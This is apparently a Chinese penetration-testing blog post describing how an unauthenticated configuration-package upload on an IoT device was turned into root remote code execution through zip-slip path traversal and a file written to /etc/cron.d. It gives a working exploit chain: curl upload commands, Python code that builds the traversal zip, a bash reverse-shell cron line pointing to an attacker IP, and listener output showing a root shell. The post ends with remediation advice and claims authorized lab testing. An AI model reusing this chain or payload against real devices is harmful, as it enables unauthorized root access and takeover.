#  从配置包上传到满分RCE漏洞挖掘之路  
原创 APT-101
                    APT-101  APT-101   2026-11-22 05:53  
  
[#漏洞挖掘]()  
[#RCE]()  
[#IoT安全]()  
[#ZipSlip]()  
[#渗透测试]()  
  
# 01 平地惊雷：一个请求，直通 root  
  
利用链只有四步：拉底包、把 cron 反弹脚本塞进 zip 的穿越条目、上传、等一分钟收 shell。没有爆破、没有社工、没有 0day 的降维打击，全是常规手法叠出来的：  
一个不要认证的上传解压 + 一个不校验路径的解压代码 + 一个以 root 跑的进程 + 一个写进去就执行的调度目录。四个条件单独看都是小毛病，串起来就是一条直达系统根的链子。  
  
授权说一句：测试全程有书面授权，跑在自己实验室的专用测试机上，PoC-only，演示完已清理并恢复现场。  
# 02 山重水复：接口清单，原来是设备自己递上来的  
  
先看设备开了什么。nmap 扫出来 4 个口：22（SSH）、80（Web 管理面）、8001（后端 API）、9001（一个 TLS 网关端口）。  
  
这里面有个思路层面的选择。挖嵌入式设备，很多人上来就 fuzz 端口、猜路径。我这次没有，因为设备自己把答案交出来了：它的 Web 管理面是个 React SPA，前端一个 4.4MB 的  
index-*.js就放在 80 端口上，随设备下发，里面写满了所有 API 路由和调用代码。  
```
curl -sS "http://<设备IP>/" -o index.html          
拿入口页curl -sS "http://<设备IP>/static/js/index-*.js" -o bundle.js   # 4.4MB 主包grep -oE '"/api/v1/[a-z0-9/_.-]+"' bundle.js | sort -u | wc -l# 137
```  
  
137 个官方 API 路径，一字不差全在 bundle 里。而且这不只是路径清单：每个路径旁边的调用代码直接把 verb、参数名、body 字段名全写出来了，等于把调用契约打印好送给你。比如配置包模块，路由对象长这样：  
```
const tye = {
  data:   "/api/v1/device/projectdoc/data",    // 下载当前配置包
  update: "/api/v1/device/projectdoc/update"   // 上传新配置包
};
```  
  
上传调用是 FormData，字段名  
file+  
text=file，清清楚楚。  
  
另一个教训在这一步就埋下了：设备对不存在的 API 路径返回的是  
HTTP 200 + 空 body，不是 404。所以判断一个端点存不存在，唯一可靠的标准是"body 里有没有业务字段"，状态码完全不可信。这个判别法后面救了我好几次。  
# 03 初窥门径：配置包导入，就是一次服务端解压  
  
projectdoc/update，字面意思"工程文档更新"，就是往设备里传一个配置包。传上去服务端直接解压、落盘。这名字里已经写了一半的事故。  
  
试一把，用 curl 传个 zip：  
```
curl -sS -X POST "http://<设备IP>/api/v1/device/projectdoc/update" \
  -H "Key: <设备IP>:8001" \
  -F "text=file" -F "file=@evil.zip;filename=cfg.promprj;type=application/octet-stream"
```  
  
响应  
{"code":0,"data":null,"message":"Success"}。就这么一个"配置包导入即解压"的接口，连个登录都没有。路由头只认  
Key，而那是个设备标识，不是个凭据。  
  
到这里，攻击面拼图齐了三块：  
上传口不要认证、  
服务端会自动解压、剩下就差解压的时候认不认路径了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNoskT2T21Asib6lhINhichX45pnIqe5p1RsJP06ObH7Y11GbntLJE2EjqPGYibI8joiaAic4BWT0E3ntDx75DrOibvvL1kHEoRcL0ykdg/640?wx_fmt=png&from=appmsg "")  
  
图1 接口清单是设备自己送的：前端 bundle 反推 137 个 API，配置包导入即解压，上传零认证  
# 04 拨云见日：差点结案，一个 14 字节的 marker 把我捞回来  
  
zip-slip 是个老概念。zip 文件里每个条目的名字可以带  
../，zip 格式本身允许这么干，解压方如果不拦，写文件时就会一路穿出目标目录。这不是 zip 格式的漏洞，是解压代码没做路径校验（CWE-22/23）。  
  
关键问题是：  
穿出去之后落在哪。理论上从解压根往上穿，穿到哪一层取决于服务端程序的工作目录。我一开始想用另一个接口去验证任意文件写是否成立，结果所有路径都报 no such file，一度把 zip-slip 判成了不存在。差点就结案了。  
  
翻案的证据，是设备自己的日志包。  
GET /controller/log（也是零认证）能把全量日志拉下来，里面不光有系统日志，还直接暴露了两件大事：解压服务 appserver 进程  
以 root 运行，以及设备真实的数据根目录是  
/usr/local/<产品目录>/userdata/controller/usrconfig/。  
  
而此前我验证写入时用的接口，它的文件系统视角是 chroot 的：它看  
/userdata/是根下的挂载点，跟服务端解压的真实根不是一回事。我对着错误的根在数  
../的级数，当然数不对。  
  
更妙的是日志里留了物证：  
controller/upgrade/upgrade.img内容是 14 字节的明文探针串（  
ZIPSLIP-PROBE）——那是我之前某次探测时写进去的 marker，它还在。这说明写入早就成功了，是我验证的视角错了。  
验证视角错了，会杀死一个真漏洞。  
  
视角对齐之后，一切都顺了。真实解压根到这里：  
```
/usr/local/<产品目录>/userdata/controller/usrconfig/
  ../           → controller
  ../../        → userdata
  ../../../     → <产品目录>
  ../../../../  → local
  ../../../../../ → usr
  ../../../../../../ → /        ← 第 6 级到根
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PIWj1VguNourXOLd51RJrJaq8QkyR5docj77cwpkgEZqBCLwUticURr0icxBjpz1v0OictDn7YxWHhzMq14CDP6cddfnyvNSb2zEjia8FaHAb0U/640?wx_fmt=png&from=appmsg "")  
  
图2 拨云见日：chroot 视角全查无此人，日志里 14 字节 marker 自证——写入早已成功，错的是验证视角  
# 05 临门一脚：三条路摆在面前，为什么偏偏是 /etc/cron.d  
  
任意文件写拿到手，接下来是把它变成代码执行。这一步要考虑系统的行为习惯，Linux 上有几条路：  
  
写自启动目录（  
/etc/init.d、systemd unit 等）——要重启或服务重启才生效  
  
写 crontab——每分钟扫描，  
写即调度  
  
写 SSH authorized_keys——那只是持久后门，不是 RCE  
  
用的是第三条中的 cron.d。  
/etc/cron.d/是 crond 每分钟扫一遍的调度目录，里面每个文件按 crontab 格式执行。文件必须是 root 能写的，而我这个解压进程正好就是 root，落盘直接继承 root:root。  
  
于是载荷很简单，69 字节：  
```
* * * * * root bash -c 'bash -i >& /dev/tcp/<攻击机IP>/1337 0>&1'
```  
  
zip 里就加一个条目，名字叫  
../../../../../../etc/cron.d/zzz-rce-poc，内容就是上面这行。剩下的活交给标准库：  
```
import io, zipfile

base = open("base.zip", "rb").read()   
设备现有配置包，原样保留CRON = b"* * * * * root bash -c 'bash -i >& /dev/tcp/<攻击机IP>/1337 0>&1'\n"SLIP = "../../../../../../etc/cron.d/zzz-rce-poc"buf = io.BytesIO()with zipfile.ZipFile(io.BytesIO(base)) as zin, </span>     zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zout:    for n in zin.namelist():        zout.writestr(n, zin.read(n))   # 底包条目原样复制，不破坏现场    zout.writestr(SLIP, CRON)           # 追加穿越条目open("evil.zip", "wb").write(buf.getvalue())
```  
  
多说一句为什么拉底包：把设备现有配置原样包进去再加穿越条目，上传之后设备的配置一条不少，纯粹是为了演示完不用重配。这不是漏洞成立的前提，不带底包只传穿越条目一样触发。  
  
上传，  
Success，然后监听端口，等。它还会给个"回执"——另一个接口  
firmware/v2会回显目标文件的 size 和 MD5（  
file size mismatch: expected N, got M这种），拿它当只读探针，能当场确认  
/etc/cron.d/zzz-rce-poc已经落盘、内容哈希一致。这一步纯粹是给证据链用的，实战不用也行。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PIWj1VguNosQEYQFVyGhE5LuXbGJQt8wvbiahSx7ZPzH167aNq91mN2eb3Om2zfRbZ0fY4MN4q5jARzqMmfbCftXjOb8ZBVs7F6lB2kTuLFc/640?wx_fmt=png&from=appmsg "")  
  
图3 cron.d 写即调度：任意文件写变 root 执行只差一分钟，无需任何触发请求  
# 06 尘埃落定：一分钟后，root 到手  
  
一分钟后：  
```
<!--data-layout-id-marker:47-->$ nc -lvnp 1337Connection received on <设备内网IP> 46208root@ubuntu-O-E-M:~iduid=0(root) gid=0(root) 组=0(root)nbsp;nc -lvnp 1337
Connection received on <设备内网IP> 46208
root@ubuntu-O-E-M:~
iduid=0(root) gid=0(root) 组=0(root)
```  
  
root@ubuntu-O-E-M，Ubuntu 原装主机名的味道。从上传到 root，中间没有任何一个需要认证的环节。  
  
收场也说明一下，避免误会：把 cron 文件内容用同一个上传口覆盖成无害注释行（crond 忽略注释），shell 里再  
rm -f兜底删掉文件，最后核对了网络档案、设备档案和登录口令都恢复正常，测试机恢复完毕。  
projectdoc/update没有删除语义，注释覆盖是 API 能做的极限；要彻底清，设备有整机重置，只在测试机上试过，能自愈。  
# 07 复盘拆解：环环相扣，断一即死  
  
这条链拆开看，每一环都平淡无奇：  
<table><thead><tr><th style="box-sizing: border-box;text-align: left;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;font-weight: bold;background-color: #DD847E;margin: 0px;color: #FFFFFF;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="64"><span leaf="">层</span></section></th><th style="box-sizing: border-box;text-align: left;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;font-weight: bold;background-color: #DD847E;margin: 0px;color: #FFFFFF;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="65"><span leaf="">问题</span></section></th><th style="box-sizing: border-box;text-align: left;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;font-weight: bold;background-color: #DD847E;margin: 0px;color: #FFFFFF;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="66"><span leaf="">CWE</span></section></th></tr></thead><tbody><tr><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="67"><span leaf="">认证</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="68"><span leaf="">JWT 可选、Key 不算凭据（上传/日志/重启端点全裸奔）</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="69"><span leaf="">CWE-306/287</span></section></td></tr><tr><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="70"><span leaf="">解压</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="71"><span leaf="">不校验 zip 条目路径穿越；appserver 以 root 跑</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="72"><span leaf="">CWE-22/434</span></section></td></tr><tr><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="73"><span leaf="">执行面</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section data-layout-id="74"><span leaf="">/etc/cron.d</span></section><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="75"><span leaf=""> 可被外部进程写、写即调度</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="76"><span leaf="">CWE-284</span></section></td></tr><tr><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="77"><span leaf="">暴露</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="78"><span leaf="">日志包把解压根、root 身份、明文口令全交出来</span></section></td><td style="box-sizing: border-box;font-size: 14px;border: 1px solid rgb(204, 204, 204);padding: 5px 10px;text-align: left;margin: 0px;"><section style="font-size: 17px;font-weight: 400;color: rgba(0,0,0,0.9);line-height: 1.8;margin-bottom: 24px;" data-layout-id="79"><span leaf="">CWE-200</span></section></td></tr></tbody></table>  
单修任何一环，整条链就断：  
强制全局认证（缺 token 一律 401）、  
解压逐条目校验路径（拒绝  
..和绝对路径，前缀白名单）、  
解压进程降权、  
/etc/cron.d  
加写保护（只读 bind mount 或 AppArmor）。四件里做一件就够，全做是四重保险。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PIWj1VguNot0gdjfHQlA2XhgQbcDvsXGpiacricgUDNYuCR5cL1iaTJp6s5Wuhibc72jBYa1iascDjyszl6AK9nqIiaRgibmhtQUWhtiaPpnS3wMgCg/640?wx_fmt=png&from=appmsg "")  
  
图4 四环相扣断一即死：认证、路径校验、进程降权、cron.d 写保护，修任意一环整条链失效  
  
附带一个漏洞挖掘的方法论收尾：这次真正卡住人的不是技术难点，是视角。设备里存在两套文件系统视角（chroot 验证口 vs 真实解压根），对着错的起算点数穿越级数，数到死也数不对。挖嵌入式设备，先在日志、配置、固件里把"程序到底在哪个目录下干活"弄清楚，比急着打载荷值钱得多。  
  
